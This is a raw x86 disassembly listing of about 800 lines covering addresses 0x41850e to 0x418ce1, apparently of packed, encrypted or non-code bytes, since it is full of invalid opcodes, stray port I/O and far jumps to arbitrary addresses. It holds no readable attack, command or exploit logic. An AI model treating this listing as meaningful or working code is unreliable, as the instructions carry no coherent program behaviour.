  41850e:	imul   ebx,DWORD PTR [esi],0xcac80c34
  418514:	push   edx
  418515:	in     al,dx
  418516:	loop   0x418537
  418518:	dec    ebx
  418519:	loopne 0x4184fd
  41851b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41851c:	add    al,0xf9
  41851e:	cmp    al,0x57
  418520:	test   al,0xf7
  418522:	pushf  
  418523:	sahf   
  418524:	jo     0x4184d1
  418526:	cmp    BYTE PTR [edi-0x1364831f],bl
  41852c:	adc    DWORD PTR [edx+0x4c],edx
  41852f:	push   edx
  418530:	cmp    dl,BYTE PTR [edx]
  418532:	fs (bad) 
  418534:	adc    eax,0x2ce72ae1
  418539:	mov    ?,esp
  41853b:	xor    eax,0x66433844
  418540:	pop    ds
  418541:	imul   DWORD PTR [ebx+ebx*2]
  418544:	xchg   edx,eax
  418545:	push   edi
  418546:	ret    
  418547:	sub    al,0xb
  418549:	out    dx,al
  41854a:	xchg   edx,eax
  41854b:	bound  edx,QWORD PTR [ebx]
  41854d:	inc    ebp
  41854e:	add    eax,0x682a4bdd
  418553:	push   ebx
  418554:	and    ah,dl
  418556:	and    BYTE PTR [esi-0x7d639e9],bh
  41855c:	scas   eax,DWORD PTR es:[edi]
  41855d:	mov    ebx,0x6790da9e
  418562:	retf   0x6021
  418565:	push   ss
  418566:	add    eax,0xe70382f3
  41856b:	add    BYTE PTR [eax-0x50],al
  41856e:	outs   dx,DWORD PTR ds:[esi]
  41856f:	lahf   
  418570:	dec    ecx
  418571:	xor    al,0x94
  418573:	cwde   
  418574:	lock in eax,0x8c
  418577:	adc    ebx,ecx
  418579:	xchg   edi,eax
  41857a:	dec    edx
  41857b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41857c:	mov    dl,bh
  41857e:	cmp    al,0xbf
  418580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418581:	stos   DWORD PTR es:[edi],eax
  418582:	mul    DWORD PTR [ebx*8-0x3d295e5]
  418589:	push   edi
  41858a:	rcr    BYTE PTR [ecx+0x42],cl
  41858d:	es add ch,dh
  418590:	adc    bl,dl
  418592:	imul   esp,DWORD PTR [ebp+eiz*8+0x1016e922],0xffffffb1
  41859a:	or     BYTE PTR ds:0x8cc9084c,cl
  4185a0:	sbb    al,BYTE PTR [edi+ebp*2-0x4c]
  4185a4:	pop    esp
  4185a5:	mov    edx,0x48025df2
  4185aa:	mov    edx,0x284a126c
  4185af:	cli    
  4185b0:	mov    ebp,DWORD PTR ds:0xee189517
  4185b6:	loop   0x4185dd
  4185b8:	inc    ecx
  4185b9:	or     dh,0x25
  4185bc:	and    dl,cl
  4185be:	sbb    eax,0x192c9e34
  4185c3:	icebp  
  4185c4:	dec    edi
  4185c5:	mov    bh,0xd3
  4185c7:	bnd ret 0x57c8
  4185cb:	and    esp,ebp
  4185cd:	ja     0x418584
  4185cf:	fs imul edx,ecx,0xffffff96
  4185d3:	fs push edi
  4185d5:	xor    eax,DWORD PTR [edx+0x2eb9efab]
  4185db:	daa    
  4185dc:	in     al,0x67
  4185de:	xchg   BYTE PTR fs:[eax+0x3d],ah
  4185e2:	pusha  
  4185e3:	xor    DWORD PTR [eax+0x2f],esp
  4185e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185e7:	mov    ?,WORD PTR [edx-0x5141acc3]
  4185ed:	les    eax,FWORD PTR [edx+eiz*2+0x53]
  4185f1:	aaa    
  4185f2:	cmp    eax,0x4f5907a8
  4185f7:	loopne 0x41862a
  4185f9:	popf   
  4185fa:	(bad)  
  4185fe:	les    edx,FWORD PTR [edx]
  418600:	sbb    eax,0xec1f55e0
  418605:	(bad)  
  418608:	or     eax,0xeabf3207
  41860d:	adc    eax,DWORD PTR ds:0xb5fc0b20
  418613:	mov    esp,0x9f74e242
  418618:	sbb    cl,cl
  41861a:	pop    ecx
  41861b:	and    al,0x31
  41861d:	aam    0x47
  41861f:	pop    ds
  418620:	dec    eax
  418621:	xlat   BYTE PTR ds:[ebx]
  418622:	aaa    
  418623:	gs jl  0x4185f1
  418626:	mov    ecx,0xf0e21a75
  41862b:	dec    eax
  41862c:	sar    DWORD PTR ds:0x33b4373d,1
  418632:	mov    ebx,fs
  418634:	pmuludq mm3,QWORD PTR [esi-0x42f869f1]
  41863b:	test   al,0x5f
  41863d:	adc    DWORD PTR [ebx-0x6d32beeb],0x2cc606fc
  418647:	add    ebx,esp
  418649:	dec    ebp
  41864a:	fwait
  41864b:	lds    ebp,FWORD PTR [esi+ebx*1]
  41864e:	rcl    DWORD PTR [ecx+0x50],0xb0
  418652:	mov    bl,0xbd
  418654:	in     eax,0x20
  418656:	clc    
  418657:	mov    BYTE PTR [ebx+0x1302670],ch
  41865d:	add    BYTE PTR ds:0xbbb88951,ch
  418663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418664:	popf   
  418665:	mov    edx,0xcdd5cf6c
  41866a:	jns    0x418669
  41866c:	push   esi
  41866d:	std    
  41866e:	bound  esp,QWORD PTR [ebx-0x2e422063]
  418674:	mov    bh,0xb8
  418676:	xor    DWORD PTR [ecx-0x6],ebx
  418679:	xor    BYTE PTR [eax-0x25d28bf8],al
  41867f:	(bad)  
  418680:	iret   
  418681:	and    BYTE PTR fs:[ebx+edi*2],ch
  418685:	xor    eax,ebp
  418687:	das    
  418688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418689:	xchg   BYTE PTR [ecx],dh
  41868b:	add    DWORD PTR [eax+0x6a],edi
  41868e:	sbb    DWORD PTR [ebx],edx
  418690:	add    edx,esi
  418692:	or     eax,0xc2f70c1a
  418697:	js     0x4186c6
  418699:	ss mov ah,0xb2
  41869c:	or     BYTE PTR [ecx+0x18],dl
  41869f:	dec    eax
  4186a0:	pop    esp
  4186a1:	shl    DWORD PTR [esi+0x58],0x56
  4186a5:	cmp    ebp,ecx
  4186a7:	mov    al,ds:0x7352c578
  4186ac:	test   eax,0x398dbe43
  4186b1:	sub    edx,DWORD PTR [ecx-0x34]
  4186b4:	push   edx
  4186b5:	xlat   BYTE PTR ds:[ebx]
  4186b6:	xor    BYTE PTR [edx],dh
  4186b8:	mov    edi,0xefdf7a15
  4186bd:	push   ss
  4186be:	push   edx
  4186bf:	ds sub dl,bh
  4186c2:	push   edx
  4186c3:	xor    BYTE PTR [ebp+0x5],ch
  4186c6:	push   esi
  4186c7:	mov    dh,ah
  4186c9:	pop    esp
  4186ca:	pop    ss
  4186cb:	xchg   edi,eax
  4186cc:	dec    ebx
  4186cd:	ja     0x41870e
  4186cf:	cmp    eax,0x936d01a9
  4186d4:	fsubr  DWORD PTR [edx-0x20]
  4186d7:	cmp    eax,DWORD PTR [edx+esi*8+0x518f14f0]
  4186de:	addr16 popf 
  4186e0:	ret    
  4186e1:	dec    esp
  4186e2:	hlt    
  4186e3:	jae    0x41875d
  4186e5:	mov    dl,0xa1
  4186e7:	push   ss
  4186e8:	xchg   ebx,eax
  4186e9:	nop
  4186ea:	stos   DWORD PTR es:[edi],eax
  4186eb:	gs mov fs,WORD PTR ds:[ecx]
  4186ef:	popf   
  4186f0:	sbb    eax,0x2bfe812f
  4186f5:	into   
  4186f6:	or     ah,BYTE PTR [ebx+esi*1+0x7d]
  4186fa:	add    eax,0x205f4f6a
  4186ff:	rcl    BYTE PTR [esi+0x14569201],0xb2
  418706:	mov    bh,0xfb
  418708:	call   0x65608791
  41870d:	test   al,0xab
  418710:	pop    eax
  418711:	xchg   ebp,eax
  418712:	stos   BYTE PTR es:[edi],al
  418713:	xor    ecx,0xffffffc4
  418716:	cdq    
  418717:	mul    DWORD PTR [ebx]
  418719:	outs   dx,DWORD PTR ds:[esi]
  41871a:	ds jp  0x418738
  41871d:	mov    BYTE PTR [esp+esi*4+0x6e975ebf],al
  418724:	pop    ebx
  418725:	das    
  418726:	div    DWORD PTR [eax]
  418728:	arpl   WORD PTR [ebx-0x65e6a8c7],ax
  41872e:	mov    ecx,0x8dac9d56
  418733:	mov    bl,0xd7
  418735:	stos   DWORD PTR es:[edi],eax
  418736:	xor    esp,DWORD PTR [eax-0x3e]
  418739:	jo     0x41872f
  41873b:	or     al,0xef
  41873d:	jmp    0x7829cff2
  418742:	xchg   ebx,eax
  418743:	dec    esi
  418744:	pop    ds
  418745:	jae    0x41877f
  418747:	inc    edx
  418748:	sbb    cl,BYTE PTR [eax+0x15]
  41874b:	call   0xbd5b153
  418750:	scas   eax,DWORD PTR es:[edi]
  418751:	sub    eax,0x361b2314
  418756:	sbb    eax,0x63afd682
  41875b:	iret   
  41875c:	lods   al,BYTE PTR ds:[esi]
  41875d:	out    dx,al
  41875e:	cmp    DWORD PTR [edi*4+0x3c6167eb],0x5dc22899
  418769:	nop
  41876a:	je     0x41878f
  41876c:	cli    
  41876d:	sbb    eax,0x5c4321e4
  418772:	sub    ch,bh
  418774:	mov    ebx,0x9ecf3eae
  418779:	push   ss
  41877a:	jo     0x418716
  41877c:	or     eax,0xfcea5169
  418781:	jo     0x4187f0
  418783:	lea    edx,ds:0xd3ea213
  418789:	stos   DWORD PTR es:[edi],eax
  41878a:	push   cs
  41878b:	in     eax,dx
  41878c:	cli    
  41878d:	int3   
  41878e:	jo     0x4187ad
  418790:	lock test DWORD PTR cs:[edx+0x611af372],0xafee461a
  41879c:	jmp    0x41881a
  41879e:	jb     0x418721
  4187a0:	cmp    al,0xcb
  4187a2:	push   esp
  4187a3:	or     al,0x7b
  4187a5:	lea    eax,[ecx+0x438d7487]
  4187ab:	push   edi
  4187ac:	or     al,0xc
  4187ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187af:	add    eax,0x38dd7f9f
  4187b4:	clc    
  4187b5:	xor    DWORD PTR [esi-0x62],eax
  4187b8:	or     bl,BYTE PTR [eax]
  4187ba:	adc    eax,0x826ac102
  4187bf:	cmp    ecx,edx
  4187c1:	nop
  4187c2:	and    al,0x4
  4187c4:	test   eax,0x1ae2ddf7
  4187c9:	fimul  WORD PTR [esi+0x654cd0c6]
  4187cf:	ja     0x4187b3
  4187d1:	imul   esp,DWORD PTR [ecx+0x5fbd9e12],0x5c
  4187d8:	cld    
  4187d9:	jo     0x41880f
  4187db:	mov    WORD PTR [eax+0x37],ds
  4187de:	sbb    al,0x56
  4187e0:	out    0xf0,al
  4187e2:	fimul  DWORD PTR [ebp-0x74672223]
  4187e8:	jae    0x4187f8
  4187ea:	mov    esi,0x43496cf
  4187ef:	pop    ebx
  4187f0:	fmul   st,st(6)
  4187f2:	aas    
  4187f3:	out    dx,eax
  4187f4:	inc    ebp
  4187f5:	pop    es
  4187f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f7:	test   eax,0xa45fbaa4
  4187fc:	and    ebx,DWORD PTR [edi+0x5f]
  4187ff:	xor    edi,DWORD PTR [ecx+0x717b4dde]
  418805:	(bad)  
  418807:	(bad)  
  418808:	fdivp  st(4),st
  41880a:	in     eax,0x4d
  41880c:	jbe    0x4187d8
  41880e:	iret   
  41880f:	fldcw  WORD PTR ds:0x21d10a0e
  418815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418816:	mov    ebp,0xc2f66311
  41881b:	sti    
  41881c:	retf   0x59c6
  41881f:	xchg   ecx,eax
  418820:	lahf   
  418821:	mov    ecx,0xace29db9
  418826:	cmp    BYTE PTR [ecx+0x52],0x60
  41882a:	test   eax,0x66ab82cd
  41882f:	fbld   TBYTE PTR [ebx]
  418831:	mov    eax,0xbf552c9c
  418836:	pop    ebp
  418837:	mov    ebx,0x11d4b19e
  41883c:	sbb    al,0xd9
  41883e:	sub    BYTE PTR [esi+0x2c6645a4],dl
  418844:	arpl   WORD PTR [esi+0x77],di
  418847:	popf   
  418848:	js     0x41880e
  41884a:	push   0x523c798f
  41884f:	cwde   
  418850:	addr16 adc esi,esi
  418853:	mov    dl,0x88
  418855:	pop    ebx
  418856:	xor    al,0x3b
  418858:	sub    al,0x4f
  41885a:	nop
  41885b:	adc    BYTE PTR [ecx],bl
  41885d:	out    dx,al
  41885e:	xor    BYTE PTR [ebp+0x48],0x37
  418862:	dec    ecx
  418863:	jecxz  0x4188a8
  418865:	or     al,0xdc
  418867:	or     DWORD PTR [edi+0x28eb295],0xad8969b8
  418871:	mov    ecx,0xafa440c
  418876:	pushf  
  418877:	out    0x91,eax
  418879:	jge    0x4188c1
  41887b:	xchg   ecx,eax
  41887c:	xchg   esi,eax
  41887d:	and    BYTE PTR [edx-0x53],ah
  418880:	ja     0x418820
  418882:	jne    0x418891
  418884:	xchg   esi,eax
  418885:	dec    ebp
  418886:	jge    0x4188d3
  418888:	jno    0x41885b
  41888a:	aas    
  41888b:	scas   eax,DWORD PTR es:[edi]
  41888c:	repz sub esp,DWORD PTR [edi-0x68c8a7b8]
  418893:	or     edi,0x5857713f
  418899:	xchg   esi,eax
  41889a:	jp     0x418853
  41889c:	jle    0x4188a9
  41889e:	les    ecx,FWORD PTR [ebp-0x38c7c0e6]
  4188a4:	cmp    DWORD PTR [ecx+0x2d],eax
  4188a7:	dec    esi
  4188a8:	inc    ecx
  4188a9:	sub    eax,0x523ba3f2
  4188ae:	je     0x4188cc
  4188b0:	gs ja  0x418858
  4188b3:	push   edi
  4188b4:	add    al,0x7
  4188b6:	in     eax,0x1
  4188b8:	ret    0xfefe
  4188bb:	sahf   
  4188bc:	cmp    DWORD PTR [ecx],0xffffffb8
  4188bf:	mov    al,0xf9
  4188c1:	ins    DWORD PTR es:[edi],dx
  4188c2:	inc    eax
  4188c3:	add    BYTE PTR [edi+ebp*2],dh
  4188c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188c7:	adc    BYTE PTR [ebp-0x33],dh
  4188ca:	add    bh,BYTE PTR [eax]
  4188cc:	in     al,dx
  4188cd:	sbb    DWORD PTR [ecx+0x5e],0x64
  4188d1:	push   0xffffffd2
  4188d3:	mov    al,ds:0x7928e4ee
  4188d8:	xchg   edx,eax
  4188d9:	mov    ebp,0xad1d2ce2
  4188de:	inc    ebp
  4188df:	ins    BYTE PTR es:[edi],dx
  4188e0:	sub    eax,0x5b1f39ec
  4188e5:	lods   al,BYTE PTR ds:[esi]
  4188e6:	aad    0xf9
  4188e8:	sub    dh,BYTE PTR [edi-0x3c]
  4188eb:	push   0xd4f59614
  4188f0:	(bad)  
  4188f1:	dec    esi
  4188f2:	mov    ds:0x5dd125b1,eax
  4188f7:	in     al,0xb0
  4188f9:	aad    0xe7
  4188fb:	ins    BYTE PTR es:[edi],dx
  4188fc:	je     0x418901
  4188fe:	icebp  
  4188ff:	repnz push ebp
  418901:	add    al,0x3c
  418903:	cmp    eax,esp
  418905:	test   al,0xea
  418907:	and    BYTE PTR [esi+0x2e1cd35d],dh
  41890d:	fldcw  WORD PTR [ecx+0x39]
  418910:	jae    0x41892d
  418912:	imul   ebp,eax,0xffffffd9
  418915:	or     ebp,DWORD PTR [edx-0x40]
  418918:	ins    BYTE PTR es:[edi],dx
  418919:	or     ch,BYTE PTR [edx+0x39]
  41891c:	xchg   ebx,eax
  41891d:	mov    cl,0x96
  41891f:	push   es
  418920:	and    cl,BYTE PTR [edx]
  418922:	enter  0xa810,0xa
  418926:	in     al,0x25
  418928:	and    al,0x37
  41892a:	and    esp,DWORD PTR [edx+esi*2-0x3a]
  41892e:	xlat   BYTE PTR ds:[ebx]
  41892f:	push   0x35d667b9
  418934:	lods   al,BYTE PTR ds:[esi]
  418935:	push   0x69
  418937:	adc    DWORD PTR [edi],ebx
  418939:	test   DWORD PTR [eax+0x1b],eax
  41893c:	lock and bl,dl
  41893f:	xchg   ebx,eax
  418940:	mov    ebx,0x727aaea2
  418945:	sbb    edi,DWORD PTR [edi]
  418947:	into   
  418948:	adc    al,0x6
  41894a:	dec    esp
  41894b:	inc    esi
  41894c:	rcr    DWORD PTR [ecx-0x2c],1
  41894f:	js     0x4189cb
  418951:	adc    BYTE PTR ds:0x9166027a,0x81
  418958:	outs   dx,DWORD PTR ds:[esi]
  418959:	shr    esp,0x65
  41895c:	pop    esp
  41895d:	fld    DWORD PTR [eax]
  41895f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418961:	push   es
  418962:	xlat   BYTE PTR ds:[ebx]
  418963:	jge    0x4189de
  418965:	and    al,0x75
  418967:	rol    BYTE PTR [esp+ebx*1+0x6d],0xbb
  41896c:	jmp    0x5db5:0x6fb13b27
  418973:	dec    edi
  418974:	popa   
  418975:	pusha  
  418976:	es (bad) 
  418978:	(bad)  
  418979:	adc    ebx,ebp
  41897b:	push   ss
  41897c:	arpl   di,dx
  41897e:	mov    DWORD PTR [edx],0xc8a1e3ba
  418984:	mov    esi,0x87fe3d11
  418989:	jmp    0x418968
  41898b:	fwait
  41898c:	pop    esi
  41898d:	retf   0x5c29
  418990:	bound  esi,QWORD PTR ds:0x29f8d250
  418996:	ja     0x41891e
  418998:	gs jmp 0x4549:0xe3dbd58a
  4189a0:	push   edx
  4189a1:	test   eax,0x962d5d73
  4189a6:	pop    ecx
  4189a7:	mov    ch,0x0
  4189a9:	xchg   ecx,eax
  4189aa:	and    DWORD PTR [edi+0x5adebcc0],esp
  4189b0:	mov    ds:0xa13b83c3,eax
  4189b5:	push   ebx
  4189b6:	xchg   esp,eax
  4189b7:	not    BYTE PTR [ebx+0x2c]
  4189ba:	or     BYTE PTR [edx+0x69f67f44],dl
  4189c0:	xor    esp,esi
  4189c2:	mov    eax,ds:0xbd602a13
  4189c7:	fldenv ds:0x96759dca
  4189cd:	jmp    0x4189b5
  4189cf:	inc    edi
  4189d0:	add    ebp,DWORD PTR [esi-0x4f27438d]
  4189d6:	add    al,0xc2
  4189d8:	fdiv   QWORD PTR [edx]
  4189da:	mov    ds:0xb2cd37ea,eax
  4189df:	dec    edx
  4189e0:	pop    eax
  4189e1:	pop    edx
  4189e2:	rcl    BYTE PTR [eax],cl
  4189e4:	cmp    BYTE PTR [esi],bl
  4189e6:	mov    eax,ds:0x322aba98
  4189eb:	xchg   esi,eax
  4189ec:	mov    ebp,0x281c6b96
  4189f1:	sub    cl,BYTE PTR [ecx-0x28]
  4189f4:	into   
  4189f5:	jp     0x418a14
  4189f7:	and    ebp,DWORD PTR [ecx]
  4189f9:	xchg   esi,eax
  4189fa:	sbb    BYTE PTR [esi+0x4e],ah
  4189fd:	jg     0x4189f7
  4189ff:	add    DWORD PTR [ecx-0x79],ecx
  418a02:	xlat   BYTE PTR ds:[ebx]
  418a03:	cmc    
  418a04:	call   0xa1ff7727
  418a09:	call   0xa9f4:0xc2d46963
  418a10:	push   esp
  418a11:	cmp    eax,0x53112976
  418a16:	iret   
  418a17:	pusha  
  418a18:	dec    edi
  418a19:	mov    esp,edi
  418a1b:	mov    ebx,DWORD PTR [esp+edx*8-0x46]
  418a1f:	std    
  418a20:	dec    BYTE PTR [edi-0x57fe1377]
  418a26:	popf   
  418a27:	dec    esi
  418a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a29:	push   esi
  418a2a:	sbb    DWORD PTR [edx],esi
  418a2c:	adc    BYTE PTR [ebx+ebx*4+0x63],al
  418a30:	aas    
  418a31:	mov    ebx,0x262ef66f
  418a36:	ret    
  418a37:	sbb    al,0xaa
  418a39:	stos   DWORD PTR es:[edi],eax
  418a3a:	jp     0x418a1b
  418a3c:	jge    0x4189d0
  418a3e:	sub    BYTE PTR [ecx+ecx*4+0x46c51b5c],bl
  418a45:	test   edi,0xbb838b30
  418a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a4c:	retf   0xb18b
  418a4f:	dec    edx
  418a50:	xchg   ecx,eax
  418a51:	sub    eax,0xce78572b
  418a56:	lds    eax,FWORD PTR [esi+0x3f96df8e]
  418a5c:	inc    eax
  418a5d:	ds jae 0x4189f4
  418a60:	push   ecx
  418a61:	push   ebp
  418a62:	add    BYTE PTR ds:0xbd3f0b7c,al
  418a68:	test   al,0x2a
  418a6a:	sbb    eax,0x66ca0025
  418a6f:	stc    
  418a70:	or     bh,BYTE PTR [edx+0x1e7a9440]
  418a76:	mov    dl,bl
  418a78:	xor    eax,0x28b40022
  418a7d:	imul   esi,DWORD PTR [ecx],0xffffff9a
  418a80:	xchg   ebx,eax
  418a81:	scas   eax,DWORD PTR es:[edi]
  418a82:	and    edi,DWORD PTR [edi+0x49b9835]
  418a88:	repnz cmp eax,DWORD PTR [edi-0x346fa911]
  418a8f:	pushf  
  418a90:	push   edx
  418a91:	jmp    0xd3e9e5cb
  418a96:	es pushf 
  418a98:	sub    al,0x37
  418a9a:	call   0x11330707
  418a9f:	xchg   esp,eax
  418aa0:	lods   eax,DWORD PTR ds:[esi]
  418aa1:	fist   WORD PTR [edx]
  418aa3:	push   0xffffffd4
  418aa5:	inc    ebx
  418aa6:	adc    eax,0xcd24bc6d
  418aab:	fidiv  DWORD PTR [eax+ecx*2+0x368435b4]
  418ab2:	push   ebx
  418ab3:	mov    edx,0x8888cd53
  418ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ab9:	adc    DWORD PTR [esi],0x7ffbdf27
  418abf:	cwde   
  418ac0:	inc    ebx
  418ac1:	jmp    0xa758:0x4cbdeaab
  418ac8:	ja     0x418b2b
  418aca:	sbb    esp,DWORD PTR [eax]
  418acc:	into   
  418acd:	cmp    ch,BYTE PTR [edi]
  418acf:	inc    ebp
  418ad0:	push   ecx
  418ad1:	sub    ebx,DWORD PTR [edi-0x2]
  418ad4:	retf   0x52fe
  418ad7:	je     0x418b44
  418ad9:	mov    dh,0xfb
  418adb:	jb     0x418b35
  418add:	(bad)  [ebx]
  418adf:	jnp    0x418a6e
  418ae1:	(bad)  
  418ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae3:	rcr    BYTE PTR [ecx-0x28],1
  418ae6:	dec    eax
  418ae7:	dec    ebx
  418ae8:	stos   DWORD PTR es:[edi],eax
  418ae9:	aas    
  418aea:	inc    esi
  418aeb:	pop    ebx
  418aec:	ja     0x418ab6
  418aee:	sahf   
  418aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418af0:	mov    eax,0xf1fe181
  418af5:	cmp    eax,0x5428d85e
  418afa:	sti    
  418afb:	jl     0x418acf
  418afd:	shl    DWORD PTR [eax-0x4c],0x49
  418b01:	push   esi
  418b02:	mov    ecx,0x2e4774ae
  418b07:	ja     0x418b35
  418b09:	test   al,0xa0
  418b0b:	inc    ebx
  418b0c:	ret    
  418b0d:	or     ah,BYTE PTR [eax+0x0]
  418b10:	fcomp  st(0)
  418b12:	push   ebp
  418b13:	retf   
  418b14:	test   BYTE PTR [esi+edi*4+0x1ecf1472],0xb0
  418b1c:	xor    cl,BYTE PTR [ecx+eiz*4+0x6e4990b7]
  418b23:	add    BYTE PTR [esp+eax*1],0xc7
  418b27:	jae    0x418aa9
  418b29:	bnd jle 0x418af7
  418b2c:	dec    ebp
  418b2d:	or     edi,DWORD PTR [edx-0x4100a644]
  418b33:	ins    BYTE PTR es:[edi],dx
  418b34:	retf   
  418b35:	loopne 0x418b15
  418b37:	ins    BYTE PTR es:[edi],dx
  418b38:	cmp    al,ch
  418b3a:	ins    DWORD PTR es:[edi],dx
  418b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b3c:	sub    dh,BYTE PTR [edx+0x45]
  418b3f:	mov    dl,0xab
  418b41:	xchg   ebx,eax
  418b42:	push   eax
  418b43:	mov    ebx,0x299ad05f
  418b48:	inc    edi
  418b49:	jnp    0x418acf
  418b4b:	imul   ebp,DWORD PTR cs:0xce46,0xaa14f1d4
  418b55:	out    0xf9,al
  418b57:	inc    eax
  418b58:	lods   al,BYTE PTR ds:[esi]
  418b59:	xchg   ecx,edx
  418b5b:	repz retf 0x7f05
  418b5f:	push   esi
  418b60:	sub    al,0x43
  418b62:	xchg   edx,eax
  418b63:	ds and dh,bh
  418b66:	xchg   edi,eax
  418b67:	arpl   bp,cx
  418b69:	(bad)  
  418b6a:	ja     0x418b74
  418b6c:	mov    al,ds:0x702c13c5
  418b71:	jno    0x418bc1
  418b73:	push   ds
  418b74:	xchg   ebp,eax
  418b75:	xchg   DWORD PTR ds:0x356c0a14,edi
  418b7b:	jmp    0x8de1:0x66ffe3be
  418b82:	call   0x1405:0x26f402f2
  418b89:	(bad)  
  418b8b:	js     0x418b4d
  418b8d:	sub    eax,0xe9ab52ba
  418b92:	call   FWORD PTR [edx+0x543553c]
  418b98:	cmp    al,0x29
  418b9a:	add    DWORD PTR ds:0x5d33db53,eax
  418ba0:	and    DWORD PTR [esi],esp
  418ba2:	jns    0x418b9a
  418ba4:	retf   0xf4fd
  418ba7:	pop    ebx
  418ba8:	jmp    0x33cf:0x388410cb
  418baf:	in     eax,0xab
  418bb1:	xor    edx,esp
  418bb3:	cdq    
  418bb4:	sbb    DWORD PTR ds:0xcda0165a,eax
  418bba:	je     0x418b6a
  418bbc:	add    BYTE PTR [esi+0x44],ch
  418bbf:	pusha  
  418bc0:	test   BYTE PTR [ebp+0x1684b513],0x7
  418bc7:	mov    al,ds:0x25a97b95
  418bcc:	mov    DWORD PTR [edx-0x12a00862],ebp
  418bd2:	pop    ecx
  418bd3:	cmp    eax,ebx
  418bd5:	cmp    edi,DWORD PTR [ebx-0x43b39794]
  418bdb:	aas    
  418bdc:	adc    al,0x62
  418bde:	stos   BYTE PTR es:[edi],al
  418bdf:	fsub   st,st(3)
  418be1:	ds je  0x418b68
  418be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be5:	jmp    0xddefbf90
  418bea:	jae    0x418b76
  418bec:	fnstcw WORD PTR [esi-0x33]
  418bef:	popa   
  418bf0:	(bad)  
  418bf1:	jae    0x418bad
  418bf3:	jae    0x418bec
  418bf5:	mov    ebp,0x7f4db6c2
  418bfa:	cmp    BYTE PTR [edx-0x5a],0xc
  418bfe:	cs jne 0x418c3c
  418c01:	mov    dh,BYTE PTR [eax+0x40]
  418c04:	hlt    
  418c05:	loop   0x418bab
  418c07:	in     al,0xd0
  418c09:	fimul  WORD PTR [edi-0x2f84cbf3]
  418c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c10:	adc    al,0x5d
  418c12:	adc    eax,0xf00cc7b5
  418c17:	test   DWORD PTR [edx-0x6e],edx
  418c1a:	adc    DWORD PTR [esi],ebp
  418c1c:	inc    ecx
  418c1d:	lds    esp,FWORD PTR [esi+0x60]
  418c20:	out    dx,al
  418c21:	cmc    
  418c22:	cmp    BYTE PTR [edi+ebp*2-0x31],0xd0
  418c27:	push   edi
  418c28:	dec    DWORD PTR [edx+0x3b98c298]
  418c2e:	xchg   DWORD PTR [ebx+0x7e],eax
  418c31:	les    edi,FWORD PTR [ebp-0x3a545c9a]
  418c37:	xchg   ebp,eax
  418c38:	mov    edx,0xe8b5757c
  418c3d:	and    BYTE PTR [ebp+0x42],bh
  418c40:	push   0xfffffff0
  418c42:	fild   DWORD PTR [ebp-0x62]
  418c45:	jg     0x418bd3
  418c47:	scas   al,BYTE PTR es:[edi]
  418c48:	mov    ecx,0xa408913
  418c4d:	or     DWORD PTR [ebx-0x3e],ebx
  418c50:	call   0x7c1d:0xc1e29fb
  418c57:	mov    ebp,0x35b4ca3f
  418c5c:	daa    
  418c5d:	add    ebx,DWORD PTR [ecx-0x29ace968]
  418c63:	retf   0xd323
  418c66:	sahf   
  418c67:	jle    0x418cd8
  418c69:	xor    BYTE PTR [ebx+0x2],bl
  418c6c:	cld    
  418c6d:	ins    BYTE PTR es:[edi],dx
  418c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c6f:	jecxz  0x418c22
  418c71:	push   ss
  418c72:	jmp    0x418cc5
  418c74:	int    0x45
  418c76:	pusha  
  418c77:	xor    al,BYTE PTR [esi]
  418c79:	mov    dl,0xd7
  418c7b:	push   0x26
  418c7d:	xlat   BYTE PTR ds:[ebx]
  418c7e:	test   BYTE PTR [edx],bl
  418c80:	arpl   WORD PTR [esi+0x62b8d243],sp
  418c86:	mov    ds:0xe6a483f5,al
  418c8b:	inc    ebx
  418c8c:	(bad)  
  418c8d:	lods   al,BYTE PTR ds:[esi]
  418c8e:	cdq    
  418c8f:	pushf  
  418c90:	sbb    eax,0x8b92e2ac
  418c95:	aaa    
  418c96:	outs   dx,DWORD PTR ds:[esi]
  418c97:	fs xchg edx,eax
  418c99:	sbb    eax,0xcad99beb
  418c9e:	int    0xb1
  418ca0:	popa   
  418ca1:	sbb    dh,BYTE PTR [ebp-0x51]
  418ca4:	ficom  DWORD PTR [ecx]
  418ca6:	scas   eax,DWORD PTR es:[edi]
  418ca7:	(bad)  
  418ca9:	mov    esp,0xded9bf20
  418cae:	daa    
  418caf:	jno    0x418cb1
  418cb1:	inc    ebx
  418cb2:	pop    ebp
  418cb3:	jg     0x418c4e
  418cb5:	add    al,0x77
  418cb7:	pop    ebx
  418cb8:	nop
  418cb9:	and    eax,0x8e21f3db
  418cbe:	fcomp  QWORD PTR [edi+ebx*4+0x7c]
  418cc2:	not    DWORD PTR [edx+0x1155b731]
  418cc8:	popa   
  418cc9:	ins    BYTE PTR es:[edi],dx
  418cca:	pop    ss
  418ccb:	pop    esi
  418ccc:	cmp    ch,dl
  418cce:	cdq    
  418ccf:	sub    edx,DWORD PTR [ebx+esi*1-0x69]
  418cd3:	retf   
  418cd4:	loope  0x418c5a
  418cd6:	mov    ch,0xcb
  418cd8:	sar    BYTE PTR [edx-0x34],1
  418cdb:	(bad)  
  418cdd:	and    dl,dh
  418cdf:	faddp  st(6),st
  418ce1:	add    al,BYTE PTR [ecx]
